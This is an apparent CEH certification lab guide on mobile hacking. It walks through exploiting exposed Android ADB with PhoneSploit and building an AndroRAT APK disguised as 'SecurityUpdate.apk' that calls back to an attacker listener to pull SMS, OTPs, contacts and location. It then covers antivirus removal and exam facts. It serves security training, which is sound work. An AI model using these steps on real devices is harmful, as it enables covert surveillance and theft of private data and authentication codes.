# Module 17: Hacking Mobile Platforms - Lab Guide

## Tools Used & Purpose

- **PhoneSploit**: Exploiting Android Debug Bridge (ADB) over port 5555 to access files, dump SMS, and spawn shell sessions.
- **AndroRAT**: Android Remote Access Tool for covertly controlling mobile devices and extracting call logs/contacts.
- **MobSF (Mobile Security Framework)**: Automated static and dynamic security assessment platform for Android and iOS applications.
- **Apktool**: Decompiling and rebuilding Android APK binaries to inspect resources, code, and manifest configurations.
- **Dex2jar / JD-GUI / JADX**: Converting Dalvik executable (.dex) files into Java source code for reverse engineering.
- **Frida**: Dynamic instrumentation toolkit for hooking functions, bypassing SSL pinning, and inspecting memory at runtime.
- **Drozer**: Security assessment framework for discovering IPC vulnerabilities in Android applications.
- **Msfvenom**: Generating Trojanized Android payloads (`android/meterpreter/reverse_tcp`) embedded into legitimate APKs.
- **Burp Suite**: Intercepting mobile application HTTP/S API traffic and analyzing REST backend endpoints.
- **Magisk / Checkra1n**: Rooting Android and jailbreaking iOS devices for low-level application analysis.
- **AVG Mobile Security**: Demonstrating mobile antivirus detection and security scanning capabilities.

---

## 6. Hands-On Practical Labs Walkthrough

### Lab 1: Hack Android Devices

#### Task 1: Exploit an Android Device through ADB using PhoneSploit

- <b>Environment:</b>
  - Attacking Machine: Parrot Security (<code>10.10.1.13</code>).
  - Target Host: Android Virtual Machine / Device (<code>10.10.1.14:5555</code>).
  - Tool: <code>PhoneSploit</code>.
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Launch PhoneSploit Framework:</b>
     - Open Terminal on Parrot Security and navigate to PhoneSploit directory:
       ```bash
       cd PhoneSploit
       python3 phonesploit.py
       ```
     - Acknowledge initialization banner.
  2. <b>Connect to Target Android Device:</b>
     - At the Main Menu, choose option <code>4</code> (Connect a new phone).
     - Enter target IP address:
       ```txt
       Enter the phone's IP: 10.10.1.14
       ```
     - PhoneSploit executes <code>adb connect 10.10.1.14:5555</code> and confirms successful connection.
  3. <b>Extract Target Information & Screenshots:</b>
     - At the Main Menu, type <code>6</code> to choose <b>Get ScreenShot</b>.
     - PhoneSploit captures the target's current display and downloads it to the local directory.
     - Type <code>13</code> to choose <b>List installed apps</b>; review installed application packages.
  4. <b>Spawn Interactive Operating System Shell:</b>
     - Type <code>10</code> to choose <b>Access Device Shell</b>.
     - An interactive Unix shell opens on the Android target:
       ```bash
       whoami
       getprop ro.build.version.release
       ```
     - Observe device returns Android version and system user identity.
  5. <b>Extract Stored Files & Launch Prank/Malicious URLs:</b>
     - Type <code>30</code> to navigate to <code>/sdcard/Download</code> and pull target documents.
     - Type <code>36</code> to open an arbitrary URL in the target device's default web browser.

---

#### Task 2: Hack an Android Device by Creating APK File using AndroRAT

- <b>Environment:</b>
  - Attacking Machine: Parrot Security (<code>10.10.1.13</code>).
  - Target Host: Android Emulator / Smartphone (<code>10.10.1.14</code>).
  - Tool: <code>AndroRAT</code>.
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Generate Weaponized APK Payload:</b>
     - Open Terminal on Parrot Security and navigate to AndroRAT:
       ```bash
       python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
       ```
     - AndroRAT compiles a stealthy Android application package containing reverse administration logic configured to connect back to <code>10.10.1.13:4444</code>.
  2. <b>Host Payload on Web Server:</b>
     - Copy the generated APK to the Apache web directory:
       ```bash
       cp SecurityUpdate.apk /var/www/html/
       systemctl restart apache2
       ```
  3. <b>Simulate Victim Installation:</b>
     - On the Android device (<code>10.10.1.14</code>), open Chrome and navigate to <code>http://10.10.1.13/SecurityUpdate.apk</code>.
     - Download and install the APK, granting requested permissions.
  4. <b>Initiate AndroRAT Listener & Establish Session:</b>
     - On Parrot Security, start the AndroRAT listener:
       ```bash
       python3 androRAT.py --shell -i 0.0.0.0 -p 4444
       ```
     - The target executes the application, and an active reverse shell session is established:
       ```txt
       [+] Connected to 10.10.1.14:xxxxx
       Interpreter:AndroRAT>
       ```
  5. <b>Exfiltrate Sensitive Device Data:</b>
     - Dump all incoming and outgoing text messages:
       ```txt
       Interpreter:AndroRAT> getSMS inbox
       ```
     - Review exfiltrated SMS records containing authentication OTPs and private conversations.
     - Retrieve all stored address book contacts:
       ```txt
       Interpreter:AndroRAT> getContacts
       ```
     - Obtain real-time GPS coordinates of the device:
       ```txt
       Interpreter:AndroRAT> getLocation
       ```

---

### Lab 2: Secure Android Devices using Various Android Security Tools

#### Task 1: Secure Android Device using AVG AntiVirus / Mobile Security

- <b>Environment:</b>
  - Target Platform: Android Smartphone / Emulator (<code>10.10.1.14</code>).
  - Defense Tool: AVG AntiVirus & Mobile Security.
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Initialize AVG Mobile Security:</b>
     - Launch AVG AntiVirus from the Android app drawer.
     - Complete initial setup and agree to the privacy and security terms.
  2. <b>Execute Full Device Security Scan:</b>
     - Click <b>Scan</b> on the main dashboard.
     - The antivirus engine scans installed APK files, internal storage, and system settings.
  3. <b>Identify & Remediate Malicious Payloads:</b>
     - The scan flags the previously installed <code>SecurityUpdate.apk</code> and AndroRAT components as high-risk Trojan threats.
     - Click <b>Resolve / Remove</b> to uninstall the malicious package and clean device storage.
  4. <b>Configure Anti-Theft & App Lock Controls:</b>
     - Enable <b>App Lock</b> with a secure PIN to prevent unauthorized opening of banking and email applications.
     - Configure <b>Web Shield</b> to automatically intercept smishing links and malicious phishing domains.

---

## 7. High-Frequency Exam Indicators & Key Memory Anchors

```javascript
+----------------------------------------------------------------------------------------------------+
|                                  CEH v13 EXAM CRITICAL FOCUS POINTS                                |
+----------------------------+-----------------------------------------------------------------------+
| Exam Question Theme        | Key Answer / Official EC-Council Exam Concept                         |
+----------------------------+-----------------------------------------------------------------------+
| Android Execution Engine   | ART (Android Runtime) uses AOT/JIT compilation executing DEX bytecode |
| Dalvik Replacement        | Replaced legacy Dalvik VM in Android 5.0+; faster execution & battery |
+----------------------------+-----------------------------------------------------------------------+
| Android Sandboxing         | Each app runs in its own VM with a unique Linux UID/GID; isolated FS  |
+----------------------------+-----------------------------------------------------------------------+
| Android Rooting Tools      | Magisk (systemless root; modifies boot.img, bypasses SafetyNet),      |
|                            | Towelroot, KingoRoot, SuperSU.                                        |
+----------------------------+-----------------------------------------------------------------------+
| iOS Hardware Security      | Secure Enclave Processor (SEP) handles biometrics (TouchID/FaceID)    |
|                            | Hardware AES engine uses factory-fused 256-bit UID inaccessible to SW |
+----------------------------+-----------------------------------------------------------------------+
| iOS Jailbreak Types        | Untethered (survives reboot); Tethered (requires PC on every boot);   |
| Checkra1n Exploit          | Checkra1n uses checkm8 Boot ROM hardware exploit on A5-A11 chips.     |
+----------------------------+-----------------------------------------------------------------------+
| ADB Network Vulnerability  | Port 5555 TCP exposed without authentication allows full remote shell;|
|                            | exploited by PhoneSploit.                                             |
+----------------------------+-----------------------------------------------------------------------+
| Telecom Protocol Flaw      | SS7 (Signaling System 7) flaws allow SMS interception (2FA bypass),   |
|                            | call eavesdropping, and global location tracking.                     |
+----------------------------+-----------------------------------------------------------------------+
| SIM Attack (Simjacker)     | Uses binary SMS targeting S@T Browser on SIM cards to send AT commands|
+----------------------------+-----------------------------------------------------------------------+
| Agent Smith Malware        | Exploits Janus vulnerability (CVE-2017-13156) to replace legitimate  |
|                            | installed apps with malicious copies without user interaction.        |
+----------------------------+-----------------------------------------------------------------------+
| Reverse Engineering Tools  | Apktool (decompiles XML/Smali), Dex2jar (DEX to JAR), JADX (DEX to Java|
|                            | MobSF (automated SAST/DAST), Frida (dynamic hooking/SSL pin bypass).  |
+----------------------------+-----------------------------------------------------------------------+
| Drozer Android Framework   | Audits exported IPC components: Activities, Providers, Receivers      |
+----------------------------+-----------------------------------------------------------------------+
```
